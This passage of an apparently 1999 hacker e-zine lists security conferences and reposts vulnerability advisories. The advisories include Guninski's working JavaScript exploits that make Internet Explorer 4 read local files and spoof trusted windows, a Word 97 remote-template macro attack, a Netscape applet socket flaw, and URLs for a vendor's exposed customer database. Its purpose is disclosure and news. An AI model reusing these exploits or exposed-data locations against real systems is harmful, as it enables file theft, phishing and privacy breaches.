+     - Remote access security 
+     - Computer forensics 
+     - Hacker tools and trends 
+     - Penetration testing 
+     - Secure messaging 
+     - Kerberos and PKI integration 
+     - Tools for auditing cyberspace 
+     - NT vs. Unix: Which is safer? 
+     - Beating hackers at their own game 
+     - Intrusion detection 
+     - Securing Unix in a TCP/IP environment 
+     - Digital certificate pilots 
+     
+     And much more 
+     
+     The conference registration fee is:
+     For ISSA members, conference only - $795
+     For ISSA members, conference plus 1 workshop - $1090
+     For ISSA members, conference plus 2 workshops - $1365
+     For ISSA Chapter Presidents, conference only - $595
+     
+     For non-members, conference only - $995
+     For non-members, conference plus 1 workshop - $1290
+     For non-members, conference plus 2 workshops - $ 1565
+     
+     To encourage chapter attendance, the following attendance fee discounts are being provided by ISSA:
+     
+     ISSA will rebate $297.00 (an amount equal to half of the Chapter President's registration fee of $595.00) if the chapter meets
+     the following attendance goals, and ISSA meets it's target of getting more than 96 total attendees:
+     - Chapters with less than 30 members need to have 4 paid members attending the conference
+     - Chapters with between 30 - 50 need 7 paid attendees
+     - Chapters with over 50 members need 9 paid attendees.
+     
+     The ISSA Annual Meeting will be held at the conference, and Board election results will be announced.
+     
+     Plan to join us. Check out the MIS Training Institute site for more details and for registration information.
+     
+     For information about last year's conference, check out MIS98.
+     
+     Last updated 1/22/99 
+     
+     @HWA
+     
+  4.0 DEFCON 7 and other CON's
+      ~~~~~~~~~~~~~~~~~~~~~~~~
+      
+      DEFCON7 - 7th year running.
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        From the site (http://www.defcon.org/)
+        
+      "DEF CON 7 is July 9-11th, 1999 in Las Vegas! 
+          
+      1.27.99 I've updated the DEF CON 7 area, 
+              and will be adding speakers this week.  I'll move on to the
+              other poeples pages next.  A new HTTP, FTP, and Real Audio server
+              is being built, and will hopefully go online in Feb.   "
+                  
+    
+    UseNix & Sage Networking'99
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    
+    Approved-By: aleph1@UNDERGROUND.ORG
+    Date: 	Fri, 29 Jan 1999 13:37:44 -0800
+    Reply-To: Cynthia Deno <cynthia@SURFNETUSA.COM>
+    Sender: Bugtraq List <BUGTRAQ@netspace.org>
+    From: Cynthia Deno <cynthia@SURFNETUSA.COM>
+    Subject:      USENIX NETWORKING '99
+    X-To:         cynthia@usenix.org
+    To: BUGTRAQ@netspace.org
+    
+    For the first time, USENIX and SAGE are bringing together the community 
+    of network administrators -- Share in expertise learned at sites of all sizes from throughout the world. Gain mastery of new technologies, techniques, and strategies for managing complex networks. 
+    
+    Tutorials * Invited Talks * Refereed Papers * Hosted Luncheons 
+    * Receptions * Birds-of-a-Feather Sessions 
+    
+    NETWORKING '99 
+    †† April 7-12, 1999 
+    †† Santa Clara Marriott Hotel 
+    †† Santa Clara, California, USA 
+    
+    Sponsored by USENIX, the Advanced Computing Systems Association 
+    Co-Sponsored by SAGE, the System Administrators Guild 
+    
+    WEB SITE: http://www.usenix.org/networking99 
+    
+    Networking '99 includes: 
+    
+    CONFERENCE ON NETWORK ADMINISTRATION 
+    Wednesday and Thursday, April 7-8, 1999 
+    †††† Outstanding speakers share their expertise and experience of the 
+    latest network technologies in case studies of real networks and 
+    refereed research papers. 
+    
+    NETWORKING TUTORIAL PROGRAM 
+    Friday and Saturday, April 9-10, 1999 
+    †††† Courses tailored to many levels of experience and spanning a wide 
+    range of topics in network administration and computer security. Bring 
+    home skills you can use immediately. 
+    
+    WORKSHOP ON INTRUSION DETECTION AND NETWORK MONITORING 
+    Sunday and Monday, April 11-12, 1999 
+    ††††† Meet and learn from the researchers and practitioners who are 
+    deploying the state of the art in techniques and technologies which can 
+    help you maintain your network's security by "automatically" detecting 
+    weaknesses or attacks in progress. 
+    
+    For the full tutorial and technical program, and online registration, 
+    http://www.usenix.org/networking99 
+    ---------------- 
+    The USENIX Association's international membership includes engineers, scientists, and technicians working on the cutting edge of systems and software.† SAGE, a special technical group within USENIX, is devoted to the advancement and recognition of system administration as a profession.† USENIX and SAGE are co-sponsors of the highly regarded LISA--System Administrators Conference. 
+    
+    CanCon99
+    ~~~~~~~~
+    And don't forget we need people for CanCon'99/2k, speakers wanted!, we expect to have
+    full details (or close to it) for a date in August, summer of 1999 also a follow-up
+    bash for New-Years (Hacking the new millennium CanCon'2k) if the summer vomit proves
+    extraordinarily popular.
+    
+    Join the mailing list on the CanCon99 page off the main HWA.hax0r.news site.
+    
+    
+    @HWA          
+  
+  5.0 Hackertown
+      ~~~~~~~~~~
+    Seen via HNN (http://www.hackernews.com/)
+
+    {
+        
+    "Welcome to hackertown." This is a new hosting service for websites 
+    about specific subjects, based on the old codezone and adapted by 
+    the WH team. 
+
+    category of sites
+    
+    ht is only for truly informative websites about advanced technology-
+    related topics, such as computing, security, networking. we will accept
+    to give accounts only for websites that meets our requirements. the WH
+    team has the responsibility to choose whether a concept is accepted or 
+    not. (See site for examples of sites NOT accepted).
+    
+    free account features
+    
+       > unlimited URLs
+       > unlimited web space (web content, ie. html/txt/cgi)
+       > no storage space (ie. file libraries/archives)
+       > unlimited transfers/hits/whatever
+       > unix operating system
+       > unlimited e-mail forwarders/aliases
+       > unlimited cgi/bin (must contact admin)
+       > server-side includes
+       > technical support
+       > ssl secure server
+                                   
+
+   standard account features ($10/year)
+       > full shell account
+       > ftp/telnet access
+       > pop3 mailbox
+       > 5mb storage space (ie. file libraries/archives)
+                                  
+
+   sign-up
+   send a e-mail to sw3wn@csoft.net with a summary of your project; we'll 
+   send you a response in a day or two if it's accepted. if you want the 
+   optional features ($10/year), you can pay either by check/money order 
+   or credit card to cubesoft communications. e-mail for more info. 
+   
+      }
+      
+    @HWA
+
+
+ 6.0 More MSIE bugs & NT peculiarities ...
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+     Discovered and published by George Guninski
+     http://www.geocities.com/ResearchTriangle/1711
+    
+     Guninski's IE 4 reading AUTOEXEC.BAT.
+
+ 
+     There is a bug in Internet Explorer 4.x (patched) which allows reading
+     local files and sending them to an arbitrary server.
+
+     The problem is: if you add '%01someURL' after the an about: URL, IE 
+     thinks that the document is loaded from the domain of 'someURL'.
+
+     This circumvents "Cross-frame security" and opens several security holes.
+
+
+     This will try to read C:\AUTOEXEC.BAT using TDC.
+
+     The bug may be exploited using HTML mail message. The exploit uses 
+     Javascript. 
+
+     For more info see the source.
+
+
+     Workaround: Disable Javascript.
+
+     Written by http://www.geocities.com/ResearchTriangle/1711 - Georgi Guninski
+
+    
+     <SCRIPT>
+
+     alert('This tries to read your AUTOEXEC.BAT\nWait few seconds.')
+
+     s="about:<SCRIPT>a=window.open('view-source:x');a.document.open();a.
+     document.write(\"<object id='myTDC' width=100 height=100 classid='
+     CLSID:333C7BC4-460F-11D0-BC04-0080C7055A83'>"
+     +"<param name='DataURL' value='c:/autoexec.bat'><param name='UseHeader'
+      value=False><param name='CharSet' VALUE='iso-8859-1'><param name='
+      FieldDelim' value='}'><param name='RowDelim' value='}'><param name='
+      TextQualifier' value='}'>"
+     +"</object><form><textarea datasrc='#myTDC' datafld='Column1' rows=10
+      cols=80></textarea></form>\");a.document.write('<SCRIPT>setTimeout(\"
+      alert(document.forms[0].elements[0].value)\",4000)</SCRIPT');a.document.
+      write('>');a.document.close();close()</"+"SCRIPT>%01file://c:/";
+     b=showModalDialog(s);
+     
+     </SCRIPT>
+     
+     Guninski's IE 4 window spoofing.
+     http://www.geocities.com/ResearchTriangle/1711/read4.html
+
+     There is a bug in Internet Explorer 4.01 (patched) which allows "window spoofing".
+
+     The problem is: if you add '%01someURL' after the URL, IE thinks that the document is loaded from the domain of 'someURL'.
+
+     This circumvents "Cross-frame security" and opens several security holes.
+
+     After visiting a hostile page (or clicking a hostile link) a window is opened and its location is a trusted site.
+     However, the content of the window is not that of the original site, but it is supplied by the owner of the page.
+     So, the user is mislead he is browising a trusted site, 
+     while he is browsing a hostile page and may provide sensitive information, such as credit card number.
+
+     The bug may be exploited using HTML mail message. The exploit uses Javascript. 
+
+     Workaround: Disable Javascript.
+
+     Written by http://www.geocities.com/ResearchTriangle/1711 - Georgi Guninski
+
+
+     Exploit code
+     ------------
+     
+     <SCRIPT>
+
+     alert('A window will be open. Examine the location and the content.
+     \nThis may also be done by clicking a link.')
+     b=showModalDialog("about:<SCRIPT>a=window.open('http://www.yahoo.com');
+     a.document.write('<HTML><HEAD><TITLE>Yahoo</TITLE><BODY></HEAD><H1>Look at
+     the address bar!<BR>');a.document.write('<A HREF=\"http://www.geocities.com/
+     ResearchTriangle/1711\">Go to Georgi Guninski\\'s home page</A></H1></BODY>
+     </HTML>');close()</"+"SCRIPT>%01http://www.yahoo.com");
+
+     </SCRIPT>     
+     
+     Guninski's IE 4 file reading bug.
+     http://www.geocities.com/ResearchTriangle/1711/read3.html
+
+
+     There is a bug in Internet Explorer 4.x (patched) which allows reading 
+     local files and sending them to an arbitrary server.
+
+     The problem is: if you add '%01someURL' after the URL, IE thinks that the
+     document is loaded from the domain of 'someURL'.
+
+     This circumvents "Cross-frame security" and opens several security holes.
+
+
+     The filename must be known.
+
+     The bug may be exploited using HTML mail message. The exploit uses Javascript. 
+     For more info see the source.
+
+     Workaround: Disable Javascript.
+
+     Written by http://www.geocities.com/ResearchTriangle/1711 - Georgi Guninski
+
+
+     Exploit Code
+     ------------
+     
+     <SCRIPT>
+
+     alert('Create a short file C:\\test.txt and its contents will be shown in
+      a dialog box.')
+     b=showModalDialog("about:<SCRIPT>a=window.open('file://c:/test.txt');
+     s='Here is your file: \\n\\n'+a.document.body.innerText;alert(s);a.close();
+     close()</"+"SCRIPT>%01file://c:/");
+
+     </SCRIPT>
+     
+     Date: Thu, 28 Jan 1999 04:53:31 PST
+     From: Georgi Guninski <guninski@HOTMAIL.COM>
+     To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
+     Subject: Javascript %01 bug in Internet Explorer
+     
+     There is a Javascript security bug in Internet Explorer 4.x (patched),
+     which circumvents "Cross-frame security" and opens several security
+     holes.
+     
+     The problem is: if you add '%01someURL' after an 'about:somecode' URL,
+     IE thinks that the document is
+     loaded from the domain of 'someURL'. Very strange?
+     
+     Some of the bugs are:
+     
+     1) IE allows reading local files and sending them to an arbitrary
+     server.
+     The filename must be known.
+     The bug may be exploited using HTML mail message.
+     Demo is available at:
+     http://www.geocities.com/ResearchTriangle/1711/read3.html
+     
+     2) IE allows "window spoofing".
+     After visiting a hostile page (or clicking a hostile link) a window is
+     opened and its
+     location is a trusted site. However, the content of the window is not
+     that of the original site,
+     but it is supplied by the owner of the page. So, the user is misled he
+     is browising
+     a trusted site, while he is browsing a hostile page and may provide
+     sensitive information,
+     such as credit card number.
+     The bug may be exploited using HTML mail message.
+     Demo is available at:
+     http://www.geocities.com/ResearchTriangle/1711/read4.html
+     
+     3) Reading AUTOEXEC.BAT using TDC.
+     Demo is available at:
+     http://www.geocities.com/ResearchTriangle/1711/read5.html
+     
+     Workaround: Disable Javascript
+     
+     Regards,
+     Georgi Guninski
+     TechnoLogica Ltd, Bulgaria
+     
+     http://www.geocities.com/ResearchTriangle/1711
+     http://www.whitehats.com/guninski
+
+
+    
+     Date: Wed, 27 Jan 1999 14:14:39 +0000
+     From: Vesselin Bontchev <bontchev@COMPLEX.IS>
+     To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
+     Subject: IE 4/5/Outlook + Word 97 security hole
+     
+     Hello folks,
+     
+     This is not a strictly Windows NT issue - it affects Windows 9x users
+     too. However, it is a very important one, so I decided to post about it
+     here.
+     
+     Remember the so-called "Russian New Year" problem in Excel? Forget it;
+     that was peanuts. Exploiting it required substantial knowledge of Excel,
+     Windows programming, and assembly language (because the size of the
+     programs that could be dropped was minimal). Not that uncommon
+     combination, but one requiring at least some level of knowledge and
+     experience from the attacker. This new problem can be exploited much,
+     MUCH easier - and all the attacker has to know is Visual Basic for
+     Applications.
+     
+     Essentially, if you are using Internet Explorer 4.x or 5.x and Word 97
+     (the beta, the original release, SR-1, or the SR-2 patch), you are
+     vulnerable. Vulnerable, in the sense that just visting a Web page can
+     result in running a hostile VBA program on your machine without any
+     warnings. If, in addition, you are using Outlook (any version of it),
+     you are even more vulnerable - the attacker can run a hostile VBA
+     program on your machine by just sending you an HTML e-mail message. (The
+     hostile program will be run when you just VIEW the message - no need to
+     click on any links.) The hostile program can do just about anything
+     (drop a virus, delete files, steal information) - VBA is an extremely
+     powerful language - and very easily.
+     
+     The problem consists of several parts. The first part is caused by the
+     fact that by default IE 4.x/5.x automatically launches
+     Word/Excel/PowerPoint to view URLs which point to DOC/XLS/PPT files (and
+     all other file extensions for these applications). That is, you are not
+     given the option to save the file to disk instead of opening it. If the
+     file contains hostile macros, these macros could be executed by the
+     respective application.
+     
+     Microsoft "protects" you from such attacks with the so-called built-in
+     macro virus protection of the Office 97 versions of the applications
+     mentioned above. That is, if the document you are trying to open
+     contains any macros, the application will display a warning by default
+     (this can be easily turned off) and will offer you the options to open
+     the document as is, to open it without the macros (the default), or not
+     to open it at all. Please note that this protection is available only in
+     Office 97 - the previous versions of these applications do not have it
+     (except the rare Word 7.0a). But they aren't vulnerable to the attack I
+     am describing anyway.
+     
+     This protection has several problems. First of all, it often causes
+     false positives - it sometimes triggers even when the document does not
+     contain any macros. (I can elaborate when exactly this happens, if there
+     is interest.) This often causes people to turn it off. Second, it
+     doesn't tell you whether the document contains a virus or not - it just
+     warns you about the generic presense of macros. Third, and worst of all,
+     the Word 97 implementation of it contains a serious security hole.
+     
+     When Word 97 opens a document, the built-in macro virus protection
+     checks this document for macros (VBA modules). However, it doesn't
+     perform a similar check on the template this document is based on - and,
+     if this template contains any auto macros, they will be executed when
+     the document based on it is opened. Without any warnings whatsoever.
+     
+     I have discovered and documented this security hole more than two and a
+     half years ago. I have reported it to Microsoft people at several
+     anti-virus conferences. Microsoft did nothing about it - until recently.
+     
+     The third part of the problem is the most substantial one - the part
+     which makes this attack easy to carry out remotely. Normally, I wouldn't
+     have revealed the technical details about it. However, the bad guys have
+     figured it out already - there is at least one Web site which tempts the
+     user to click on a link allegedly containing a "list of sex sites
+     passwords" and which uses this attack to infect the user's machine with
+     a macro virus which infects both Word 97, Excel 97 and PowerPoint 97
+     documents. :-(
+     
+     So, the third part of the problem is caused by the fact that when
+     specifying the template a Word 97 document is based on, you can specify
+     not just a local file but also an URL. The previous versions of Word do
+     not have this capability, therefore they are not vulnerable to this
+     attack.
+     
+     I had prepared a demonstration of the attack and it seems to have been
+     impressive enough, because Microsoft reacted rather quickly this time -
+     in about a week. They issued a patch which fixed the second part of the
+     problem - with it, the built-in macro virus protection of Word 97 checks
+     for macros not only the document that is being opened but also the
+     template it is based on. Please see
+     
+       Microsoft Security Bulletin:
+       http://www.microsoft.com/security/bulletins/ms99-002.asp
+       Office Update Download Page:
+       http://officeupdate.microsoft.com/downloaddetails/wd97sp.htm
+     
+     for more information.
+     
+     Folks, if you are using IE 4.x/5.x and/or Outlook and Word 97, you
+     _*MUST*_ install this patch! Otherwise your systems are WIDE opened and
+     the security hole is *trivial* to exploit! Note, however, that the patch
+     will install only on Word 97 SR-1 or SR-2. It will *not* install on the
+     original Word 97. If you patch Word 97 SR-1, this will not prevent from
+     patching it later to SR-2.
+     
+     I would also advise you to make the necessary changes so that IE offers
+     you the option to save the remote DOC/DOT files instead of automatically
+     launching Word to view them. In order to do this, start the Explorer
+     (the file explorer, not IE), select View/Options/File Types, find the
+     types Microsoft Word <anything> (where <anything> stands for Addin,
+     Backup Document, Document, Template, Wizard and anything else you find
+     there), select each one of them in sequence, click on the Edit button
+     and make sure that the checkbox labeled "Confirm Open After Download"
+     (near the bottom of the dialog that appears) is checked.
+     
+     And, in general, do not trust files with executable content received
+     >from dubious sources. Unfortunately, as Microsoft continues to blur the
+     difference between your local hard disk and the Internet, problems like
+     this one will only get worse. :-( I wonder when we'll see another
+     Internet Worm based on a security hole like that... Connectivity is a
+     good thing, but it has to rely on a sound security model - not on a
+     bunch of patched-together last-minute ugly hacks which try to "protect"
+     you by essentially telling you that "you are doing something, are you
+     sure?".
+     
+     Regards,
+     Vesselin
+     --
+     Vesselin Vladimirov Bontchev, not speaking for FRISK Software International,
+     Postholf 7180, IS-127, Reykjavik, Iceland               producers of F-PROT.
+     e-mail: bontchev@complex.is, tel.: +354-561-7273, fax: +354-561-7274
+     PGP 2.6.2i key fingerprint: E5 FB 30 0C D4 AA AB 44  E5 F7 C3 18 EA 2B AE 4E
+     
+    
+
+    @HWA
+    
+6.1 Netscape 4.5 Bugs
+    ~~~~~~~~~~~~~~~~~
+ 
+      Just to keep things even we came across some Netscape bugs from the uploads
+     are of Packet Storm, so here's the latest NS poop as well;
+    
+     Date: Tue, 2 Feb 1999 13:42:32 -0800
+     From: Giao Nguyen <grail@CAFEBABE.ORG>
+     To: BUGTRAQ@netspace.org
+     Subject: Unsecured server in applets under Netscape
+     
+     Just for kicks, I wrote a sample applet that listened on a socket. I
+     discovered that when the applet was loaded under Netscape (as tested
+     with version 4.5), any hosts could then connect to the machine running
+     this applet. I won't bore anyone with the code because it's so trivial
+     that a novice to Java should be able to write it with ease after
+     reading some documentation.
+     
+     According to Java in a Nutshell, 2nd edition, p. 139:
+     
+     * Untrusted code cannot perform networking operations, exception
+     certain restricted ways.  Untrusted code cannot:
+       [...]
+       - Accept network connections on ports less than or equal to 1024 or
+         from any host other than the one from which the code itself was
+         loaded.
+     
+     While the port number restriction is held by the VM, the point of
+     origin restriction is not held at all.
+     
+     I don't feel qualified to comment on the full implication of this but
+     I'm sure more inventive minds can arrive at more interesting uses of
+     this feature.
+     
+     The work around is rather simple. Disable Java runtime in the Netscape
+     browser.
+     
+     As hinted above, Internet Explorer's Java runtime does not exhibit
+     this behaviour.
+     
+     I have contacted Netscape (via some truly useful web pages) but I've
+     not received any responses to the following information. I hope it's
+     useful to someone out there.
+     
+     Giao Nguyen
+     
+     ------------------------------------------------------------------------
+     
+     Date: Wed, 3 Feb 1999 07:45:13 -0000
+     From: BVE <bve@QUADRIX.COM>
+     To: BUGTRAQ@netspace.org
+     Subject: Re: Unsecured server in applets under Netscape
+     
+        Date:        Tue, 2 Feb 1999 13:42:32 -0800
+        From:        Giao Nguyen <grail@CAFEBABE.ORG>
+     
+        Just for kicks, I wrote a sample applet that listened on a socket. I
+        discovered that when the applet was loaded under Netscape (as tested
+        with version 4.5), any hosts could then connect to the machine running
+        this applet. I won't bore anyone with the code because it's so trivial
+        that a novice to Java should be able to write it with ease after
+        reading some documentation.
+     
+        According to Java in a Nutshell, 2nd edition, p. 139:
+     
+        * Untrusted code cannot perform networking operations, exception
+        certain restricted ways.  Untrusted code cannot:
+          [...]
+          - Accept network connections on ports less than or equal to 1024 or
+            from any host other than the one from which the code itself was
+            loaded.
+     
+        While the port number restriction is held by the VM, the point of
+        origin restriction is not held at all.
+     
+     
+     The error in your analysis is most likely that you were running Java code from
+     a class file installed on your local machine, as opposed to one which is
+     downloaded from a web site somewhere.  The former is considered "trusted,"
+     while the latter is "untrusted."
+     
+     Any class file you've compiled on your local machine will be considered
+     "trusted," and will be allowed to do pretty much anything it wants.  Similarly,
+     any class file you've copied to your hard drive, as opposed to downloading from
+     within a web browser, will be considered "trusted."
+     
+     --
+     
+                                          -- Bill Van Emburg
+                                             Quadrix Solutions, Inc.
+     Phone: 732-235-2335, x206               (bve@quadrix.com)
+     Fax:   732-235-2336                     (http://quadrix.com)
+             "You do what you want, and if you didn't, you don't"
+     
+     ------------------------------------------------------------------------
+     
+     Date: Wed, 3 Feb 1999 00:49:10 -0800
+     From: Giao Nguyen <grail@CAFEBABE.ORG>
+     To: BUGTRAQ@netspace.org
+     Subject: Re: Unsecured server in applets under Netscape
+     
+     BVE writes:
+      >
+      > The error in your analysis is most likely that you were running Java code from
+      > a class file installed on your local machine, as opposed to one which is
+      > downloaded from a web site somewhere.  The former is considered "trusted,"
+      > while the latter is "untrusted."
+     
+     You'd think so. Don't worry. I sat on this bug for two days to verify
+     that I had everything workin right and that I didn't have any funny
+     servers on my favorite port numbers. I tend to use 6969 whenever I
+     want to test something. The first iteration of this worked. I was
+     shocked.
+     
+     A coworker mentioned the exact same thing you did. So I put it on our
+     development server. Loaded the web page. Same result. I then telnet to
+     a machine approximately 3000 miles away on a separate network
+     unrelated to the network I was on. Same result. Just for kicks I got
+     some folks from other companies to help me verify that lunch didn't
+     include liquids which the company might frown upon. Same result.
+     
+     The fact that my test was done on a Windows box and others repeated
+     the tests on a Unix platform confirmed that this was not a Windows +
+     Netscape related problem but that it was indeed a Netscape specific
+     thing.
+     
+      > Any class file you've compiled on your local machine will be considered
+      > "trusted," and will be allowed to do pretty much anything it wants.  Similarly,
+      > any class file you've copied to your hard drive, as opposed to downloading from
+      > within a web browser, will be considered "trusted."
+     
+     Yes, CLASSPATH contamination. I am aware of this.
+     
+     To verify that it's not CLASSPATH contamination, I'm putting the
+     sample up at http://www.cafebabe.org/sapplet.html It doesn't do
+     anything other than allow connections to be made. It listens on 6969
+     btw. Now, the security measures as implemented by Netscape doesn't
+     allow for the equivalence of an accept() call to be made. However, it
+     could present an opportunity for DoS attacks. The source is at
+     http://www.cafebabe.org/Sapplet.java .
+     
+     In retrospect, I think the topic is wrong. It should have been
+     different. The opportunity is still present for those who has a use
+     for such thing. YMMV.
+     
+     Giao Nguyen
+     
+     ------------------------------------------------------------------
+     [http://www.cafebabe.org/sapplet.html]
+     
+     This page contains an applet listening on port 6969. It doesn't do
+           anything other than that.  How useful is it?
+     
+     <applet code=Sapplet.class width=10 height=10>
+     </applet>
+     ------------------------------------------------------------------
+     
+     
+     ------------------------------------------------------------------
+     [http://www.cafebabe.org/Sapplet.java]
+     
+     import java.net.*;
+     import java.io.*;
+     import java.applet.*;
+     
+     public class Sapplet extends Applet {
+       ServerSocket  s;
+       public void init() {
+         try {
+           s = new ServerSocket(6969);
+         } catch (IOException io) {
+           System.out.println("Well drat, it didn't work.");
+         }
+       }
+     }
+     ------------------------------------------------------------------
+     
+     ------------------------------------------------------------------------
+     
+     Date: Wed, 3 Feb 1999 14:51:36 -0500
+     From: Tramale K. Turner <shidoshi@black.kage.net>
+     To: BUGTRAQ@netspace.org
+     Subject: Re: Unsecured server in applets under Netscape
+     
+     Confirmed on Netscape 4.5 running on an NT 4 SP 4 box.
+     
+     Loaded up a similar applet on the internal network without standard applet
+     callback methods of stop() or destroy().  Kill the window that opened the
+     applet and the socket remains running (as expected, and only if some other
+     application in the same process space is running).
+     
+     Fun!
+     
+     --Shido
+     
+     Shidoshi@monkey.org
+
+   @HWA
+
+7.0 The Datalynx Hole
+    ~~~~~~~~~~~~~~~~~
+    From: http://www.csoft.net/~inn/
+    Innerpulse News Network
+    
+    DataLynx, Inc is the partner you can rely on 
+    Contributed by sw3
+    Thursday - February 04th, 1999. 02:01PM UTC 
+
+      After reading a L0pht advisory on DataLynx suGuard, I went to their
+    website to download the product to test it myself. In a matter of minutes I could
+    download their whole users database. Personal addresses, e-mails, phone
+    numbers and such. 
+
+     Stupid enough, their Perl sign-up script uses a 'setup file', which is
+    world-readable (the script run off http must read it, I presume). Instead of, oh I
+    don't know, putting the setup files in a web-readable directory, or restricting
+    web access to it. Anyways, it's readable, and that 'setup' file contains locations
+    of, a database, pgp temporary file, other Perl scripts and such. I sent e-mail to
+    the company about it, never got a reply.     
+    
+    A setup file
+    ~~~~~~~~~~~~
+    (From:http://www.dlxguard.com/cgi-bin/Form_processor/Setup_files/infodemo2.setup)
+    Database: http://www.dlxguard.com/cgi-bin/Form_processor/Databases/infodemo2.data
+    Parser: ftp://inn.csoft.net/pub/ar/dlx-parser/parser.pl
+    
+    #######################################################################
+    #                         Email Variables                             #
+    #######################################################################
+    
+    $should_i_mail = "yes";
+    $should_i_send_user_email = "no";
+    $email_of_sender = "sales\@dlxguard.com";
+    $email_to = "sales\@dlxguard.com";
+    $email_subject = "Information/Download Request";
+    
+    #######################################################################
+    #                         PGP Variables                             #
+    #######################################################################
+    
+    $should_i_use_pgp = "no";
+    $pgp_lib_path = "./Library/pgp-lib.pl";
+    $pgp_temp_file_path ="./Temp/pgp-temp-file";
+    
+    #######################################################################
+    #                       Location Variables                            #
+    #######################################################################
+    
+    $url_of_the_form = "http://www.dlxguard.com/infodemo2.htm";
+    $location_of_mail_lib = "./Library/mail-lib.pl";
+    $location_of_setup_file = "infodemo2.setup";
+    
+    #######################################################################
+    #                  Database Variables                                 #
+    #######################################################################
+    
+    $should_I_append_a_database = "yes";
+    $location_of_database = "./Databases/infodemo2.data";
+    $database_delimiter = ",";
+    
+    #######################################################################
+    #                  Defining your Fields                               #
+    #######################################################################
+    
+    
+    @form_variables = ("name",
+                       "client_email",
+                       "title",
+                       "company",
+                       "address",
+                       "city",
+                       "state",
+                       "zip",
+                       "telephone",
+                       "fax",
+                       "question_os",
+                       "testing_schedule",
+                       "purchase_schedule",
+                       "question_security",
+                       "question_referral",
+                       "filename",
+                       "request_mail_guardian",
+                       "request_mail_ntagent",
+                       "request_mail_guardian_esl",
+                       "request_mail_suguard",
+                       "request_mail_auditguard",
+                       "request_mail_webguard",
+                       "request_mail_scentr",
+                       "comments");
+    
+    %form_variable_name_map = ("name",              "Name",
+                               "client_email",      "E-mail",
+                               "title",             "Title",
+                               "company",           "Company",
+                               "address",           "Address",
+                               "city",              "City",
+                               "state",             "State",
+                               "zip",               "Zip",
+                               "telephone",         "Telephone",
+                               "fax",               "Fax",
+                               "question_os",       "Operating System",
+                               "testing_schedule",  "Product Evaluation Schedule",
+                               "purchase_schedule", "Product Purchase Schedule",
+                               "question_security", "Security Concern",
+                               "question_referral", "Referral",
+                               "filename",          "File to download",
+                               "request_mail_guardian",     "Guardian mail",
+                               "request_mail_ntagent",      "Guardian agent mail",
+                               "request_mail_guardian_esl", "Guardian ESL mail",
+                               "request_mail_suguard",      "suGuard mail",
+                               "request_mail_auditguard",   "Auditguard mail",
+                               "request_mail_webguard",     "Webguard mail",
+                               "request_mail_scentr",       "Security CeNTer mail",
+                               "comments",                  "Comments");
+    
+    @required_variables = ( "name",
+                            "fax",
+                            "title",
+                            "company",
+                            "address",
+                            "city",
+                            "state",
+                            "telephone",
+                            "zip",
+                            "question_os",
+                            "client_email");
+    
+    
+    #######################################################################
+    #                    MIscellaneous Options                            #
+    #######################################################################
+    
+    $should_user_verify = "yes";
+    $current_century = "20";
+    
+    #######################################################################
+    #                 required_fields_error_message Subroutine            #
+    #######################################################################
+    
+    sub required_fields_error_message
+      {
+      print "Content-type: text/html\n\n\n"; 
+      print qq~
+      <HTML>
+      <HEAD>
+      <TITLE>Error in Processing Form - Required Fields</TITLE>
+      </HEAD>
+      <BODY BGCOLOR = "FFFFFF" TEXT = "000000">
+    
+      <BLOCKQUOTE>
+    
+      <H2>
+      I'm sorry, the following fields are required:
+    
+      <UL>~;
+      foreach $variable (@required_variables)
+        {
+        print qq~
+        <LI>$form_variable_name_map{$variable}~;
+        }
+      print qq~</UL>
+    
+      Please click the "back" button on your browser or click <A HREF =
+      "$url_of_the_form">here</A> to go back and make sure you fill out all
+      the required information.
+      </H2>
+    
+      </BLOCKQUOTE>
+      </BODY>
+      </HTML>~;
+      }
+    
+    #######################################################################
+    #                 cannot_find_database Subroutine                     #
+    #######################################################################
+    
+    sub cannot_find_database
+      {
+      print "Content-type: text/html\n\n\n"; 
+      print qq~
+      <HTML>
+      <HEAD>
+      <TITLE>Form Processing Error - Database Error</TITLE>
+      </HEAD>
+      <BODY BGCOLOR = "FFFFFF" TEXT = "000000">
+     
+      <H2>
+      <BLOCKQUOTE>
+      I'm sorry, I am having trouble finding the database that this
+      information should be sent to.  Please contact 
+      <A HREF = "mailto:$email_to">Datalynx Webmaster</A> and let us know that there
+      has been a problem.  Thank you very much and sorry about the
+      inconvenience.
+      </BLOCKQUOTE>
+      </H2>
+      </BODY>
+      </HTML>~;
+      }
+    
+    #######################################################################
+    #                        HTML Reply Subroutines                       #
+     #######################################################################
+    sub html_reply_header
+      {
+      if ($form_data{'filename'} ne "")
+        {    
+        print "Location: ftp://ftp.dlxguard.com/pub/$form_data{'filename'}\n\n";
+        exit(0);
+        }
+      print "Location: http://www.dlxguard.com/thankyourequest.htm\n\n";
+      exit(0);
+      }
+    
+    sub html_reply_body
+      {
+      }
+    
+    sub html_reply_footer
+      {
+      }
+    
+    sub display_preexp_screen
+      {
+       print "Content-type: text/html\n\n\n";
+       print qq~
+      <HTML>
+      <HEAD>
+       <TITLE>IMPORTANT NOTICE !</TITLE>
+       <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+       <META NAME="GENERATOR" CONTENT="Mozilla/3.01Gold (X11; I; OSF1 V4.0 alpha) [\
+    Netscape]">
+    
+    </HEAD>
+    <BODY BGCOLOR="#FFFFFF" BACKGROUND="gtex.gif">
+    
+    <FORM METHOD = "POST" ACTION = "eula.cgi">~;
+      foreach $variable (@form_variables)
+      {
+        $form_data{$variable} =~ s/"/&quot;/g;
+        $form_data{$variable} =~ s/\</&lt;/g;
+        $form_data{$variable} =~ s/\>/&gt;/g;
+        $form_data{$variable} =~ s/\n/\<P\>/g;
+        print qq~
+        <INPUT TYPE = "hidden" NAME = "$variable"
+                               VALUE = "$form_data{$variable}">~;
+      }
+    print qq~
+    <INPUT TYPE = "hidden" NAME = "setup_file" VALUE = "$location_of_setup_file">
+    <table align="center" cellspacing="15">
+      <tr>
+        <td><p><img src="logo45.gif" height="100" width="100" align="CENTER"></td>
+        <td valign="middle">
+          <p><b><font size="+2" color="#FF0000">&nbsp;&nbsp; IMPORTANT NOTICE !
+          </font></b></p>
+        </td>
+      </tr>
+    </table>
+    </center>
+    <blockquote>
